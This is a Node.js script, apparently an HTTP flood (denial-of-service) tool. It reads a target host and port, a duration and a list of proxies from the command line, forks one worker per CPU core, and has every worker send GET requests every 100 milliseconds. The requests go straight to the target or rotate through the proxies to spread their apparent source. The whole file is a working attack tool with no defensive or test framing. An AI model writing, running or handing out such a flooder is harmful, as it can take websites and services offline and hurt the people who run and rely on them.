const http = require('http');
const fs = require('fs');
const readline = require('readline');
const cluster = require('cluster');
const numCPUs = require('os').cpus().length;

const target = process.argv[2];
const time = parseInt(process.argv[3]);
const proxiesFilePath = process.argv[4];
const useGet = process.argv[5] === 'true'; // Check if GET method should be used

let proxies = [];
let proxyIndex = 0;

// Read proxies from file
const rl = readline.createInterface({
  input: fs.createReadStream(proxiesFilePath),
  console: false
});

rl.on('line', (line) => {
  proxies.push(line.trim());
});

rl.on('close', () => {
  if (proxies.length === 0) {
    console.error('No proxies available');
    process.exit(1);
  }

  // Start making requests
  if (cluster.isMaster) {
    for (let i = 0; i < numCPUs; i++) {
      cluster.fork();
    }

    cluster.on('exit', (worker, code, signal) => {
      console.log(`Worker ${worker.process.pid} died`);
    });
  } else {
    startRequests();
  }
});

function startRequests() {
  const interval = setInterval(() => {
    let currentProxy = null;
    if (useGet) {
      currentProxy = proxies[proxyIndex++];
      if (proxyIndex >= proxies.length) {
        proxyIndex = 0; // Reset proxyIndex if it reaches the end of the proxies array
      }
    }

    makeRequest(currentProxy);

  }, 100);

  setTimeout(() => {
    clearInterval(interval);
    console.log('Time limit reached, exiting');
    process.exit(0);
  }, time * 1000);
}

function makeRequest(proxy) {
  if (!useGet || !proxy) {
    // If useGet is false or no proxy is available, make request to the target directly
    const options = {
      host: target.split(':')[0],
      port: parseInt(target.split(':')[1]),
      method: 'GET', // Default to GET method
      path: '/', // Default path
    };

    const req = http.request(options, (res) => {
      console.log(`connected to target ${target}`);
      // Do something with the response if needed
      res.on('data', (chunk) => {
        // Handle response data
      });
    });
    
    req.on('error', (error) => {
      console.error(`Error with target ${target}: ${error.message}`);
    });

    req.on('timeout', () => {
      console.error(`Timeout connecting to target ${target}`);
      req.destroy(); // Close the request
    });

    req.setTimeout(5000); // Set timeout for the request (5 seconds)

    // Send the request
    req.end();
  } else {
    // Use proxy for the request
    const options = {
      host: proxy.split(':')[0],
      port: parseInt(proxy.split(':')[1]),
      method: 'GET', // Default to GET method
      path: `http://${target}`, // Use full URL with target
    };

    const req = http.request(options, (res) => {
      console.log(`Connected to proxy: ${proxy}`);
      // Do something with the response if needed
      res.on('data', (chunk) => {
        // Handle response data
      });
    });

    req.on('error', (error) => {
      console.error(`Error with proxy ${proxy}: ${error.message}`);
    });

    req.on('timeout', () => {
      console.error(`Timeout connecting to proxy ${proxy}`);
      req.destroy(); // Close the request
    });

    req.setTimeout(5000); // Set timeout for the request (5 seconds)

    // Send the request
    req.end();
  }
}
